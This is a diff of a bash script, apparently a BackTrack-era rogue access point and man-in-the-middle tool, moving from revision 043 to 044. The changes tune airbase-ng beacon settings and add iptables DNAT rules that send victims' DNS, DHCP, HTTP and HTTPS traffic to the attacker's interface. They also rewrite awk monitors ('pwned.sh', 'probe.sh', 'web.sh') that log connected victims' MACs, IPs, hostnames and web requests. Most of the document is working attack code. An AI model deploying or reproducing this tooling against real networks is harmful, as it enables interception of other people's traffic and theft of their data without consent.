@@ -5,7 +5,7 @@
 ####################
 # GLOBAL VARIABLES #
 ####################
-REVISION=043
+REVISION=044
 function todo(){
 echo "TODO LIST FOR NEWER REVISIONS"
 echo "- Fix For Ping Victim"
@@ -37,8 +37,8 @@ ATHIFACE=wlan0
 ESSID=WiFi
 CHAN=1
 MTU=1800
-PPS=1000
-BEAINT=100
+PPS=500
+BEAINT=50
 WIFILIST=
 OTHEROPTS=
 MAC=$(ifconfig $ATHIFACE | awk '/HWaddr/ { print $5 }')
@@ -86,7 +86,7 @@ function checkupdate(){
 pinginternet
 if [ "$INTERNETTEST" != "icmp_seq=1" ]; then echo "[$FAIL] No Internet Connection";
 else
-newrevision=$(`curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/README | grep REVISION= | cut -d'=' -f2`)
+newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/README | grep REVISION= | cut -d'=' -f2)
 if [ "$newrevision" -gt "$REVISION" ]; then update; fi
 fi
 }
@@ -109,12 +109,11 @@ update
 fi
 }
 function stopshit(){
-service apache2 stop > /dev/null
-service dhcp3-server stop > /dev/null
-service dnsmasq stop > /dev/null
+service apache2 stop &>/dev/null
+service dhcp3-server stop &>/dev/null
+service dnsmasq stop &>/dev/null
 killall -9 aircrack-ng airodump-ng aireplay-ng airbase-ng wireshark mdk3 dnsmasq driftnet urlsnarf dsniff &>/dev/null
-killall -9 tail awk &>/dev/null
-killall -9 $folder/pwned.sh &>/dev/null
+killall -9 dhclient dhclient3 NetworkManager wpa_supplicant &>/dev/null
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
@@ -314,7 +313,7 @@ gnome-terminal --geometry=133x35 --hide-menubar --title=DNSERVER -e "dnsmasq --n
 function startdnsmasqresolv(){
 echo "dhcp-option=lan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
 echo "| DNSMASQ With Internet             |"
-gnome-terminal --geometry=133x35 --hide-menubar --title=DNSERVER -e \
+gnome-terminal --geometry=134x35 --hide-menubar --title=DNSERVER -e \
 "dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function nodhcpserver(){
@@ -322,23 +321,20 @@ echo "Not Using A Local DHCP Server For MitM"
 }
 function taillogs(){
 echo > /var/log/syslog
-echo "awk '/directed/ {for (i=9; i<=NF; i++) printf(\"TIME: %s | MAC: %s | IP: 000.000.000.000 | TYPE: PROBE REQUEST | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" > probe.sh
-echo "awk '/Client/ {for (i=8; i<=NF; i++) printf(\"TIME: %s | MAC: %s | IP: 000.000.000.000 | TYPE: CONNECTEDTOAP | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" > pwned.sh
-echo "awk '/DHCPACK\\(at0\\)/ {printf(\"TIME: %s | MAC: %s | IP: %s | TYPE: DHCP ACK [OK] | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> pwned.sh
-echo "awk '/-/ {printf(\"TIME: %s | MAC: 00:00:00:00:00:00 | IP: %s | TYPE: WEB HTTP REQU | HOSTNAME: $VICTHOST | %s\n\", substr(\$4,14), \$1, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" > web.sh
+# for (i=9; i<=NF; i++)
+echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" > probe.sh
+echo "awk '/Client/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" > pwned.sh
+echo "awk '/DHCPACK\\(at0\\)/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> pwned.sh
+echo "awk '/-/ {printf(\"TIME: %s | MAC: 00:00:00:00:00:00 | TYPE: WEB HTTP REQU | IP: %s | HOSTNAME: $VICTHOST | %s\n\", substr(\$4,14), \$1, \$6, \$11, \$7, \$8)}' < <(tail -f $folder/access.log)" > web.sh
 chmod a+x probe.sh
 chmod a+x pwned.sh
 chmod a+x web.sh
-#gnome-terminal --geometry=133x35 --hide-menubar --title=PROBE -e "probe.sh &"
-#gnome-terminal --geometry=133x35 --hide-menubar --title=PWNED -e "pwned.sh &"
-#gnome-terminal --geometry=133x35 --hide-menubar --title=WEB -e "web.sh &"
-#$popterm -e "awk '/directed/ {printf(\"TIME: \$1 | MAC: \$7 | IP: 00.0.0.000 | TYPE: PROBE REQUEST | ESSID: \$9\")}' < <(tail -f airbaseng.log)"
-#$popterm -e "awk '/Client/ {printf(\"TIME: %s | MAC: %s | IP: 00.0.0.000 | TYPE: CONNECTED | ESSID: %s\", \$1, \$3, \$8)}' < <(tail -f airbaseng.log)"
-#$popterm -e "awk '/DHCPACK/ {printf(\"TIME: %s | MAC: %s | IP: %s | HOSTNAME: %s\", \$3, \$8, \$7, \$9)}' < <(tail -f /var/log/syslog)"
+gnome-terminal --geometry=134x35 --hide-menubar --title=WEB -e "/bin/bash web.sh"
+gnome-terminal --geometry=134x17 --hide-menubar --title=PWNED -e "/bin/bash pwned.sh"
+gnome-terminal --geometry=134x17 --hide-menubar --title=PROBE -e "/bin/bash probe.sh"
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
-#$popterm -e "awk '{printf(\"TIME: %s | MAC: %s | IP: %s | HOSTNAME: \$VICTHOST | WEB: %s\", substr(\$4,14), \$1, \$11, \$6, \$7, \$8)}' < <(tail -f access.log)"
 #gnome-terminal --geometry=130x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
 #"tail -f /var/log/apache2/error.log"
 }
@@ -679,8 +675,6 @@ type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger";}
 type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit";}
 # apt-get install python-dev
 stopshit
-killall -q -9 dhclient dhclient3 NetworkManager wpa_supplicant
-modprobe tun
 mydistro="`awk '{print $1}' /etc/issue`"
 myversion="`awk '{print $2}' /etc/issue`"
 myrelease="`awk '{print $3}' /etc/issue`"
@@ -694,6 +688,7 @@ echo "|"
 echo "| $mydistro Version $myversion Release $myrelease"
 fi
 echo "+===================================+"
+modprobe tun
 echo ""
 if [ "$AUTOMODE" = "FALSE" ]; then poisonmenu; fi
 if [ "$AUTOMODE" = "FALSE" ]; then verbosemenu; fi
@@ -775,7 +770,10 @@ ln -s /var/log/apache2/access.log $folder/access.log
 ln -s /var/log/apache2/error.log $folder/error.log
 service apache2 start > /dev/null
 firewall
+iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP
 echo "+===================================+"
@@ -784,9 +782,13 @@ echo "+===================================+"
 fi
 if [ "$mode" = "2" ]; then
 firewall
+iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p udp -j DNAT --to $GW
+iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp -j DNAT --to $GW
+iptables -t nat -A PREROUTING -p udp -j DNAT --to $GW
 iptables -t nat -A POSTROUTING -o $LANIFACE -j MASQUERADE
 #iptables -t nat -A PREROUTING -i $LANIFACE -p tcp --dport 80 -j REDIRECT --to-port 3128
 #iptables -t nat -A POSTROUTING -o $LANIFACE -p tcp --dport 3128 -j REDIRECT --to-port 80
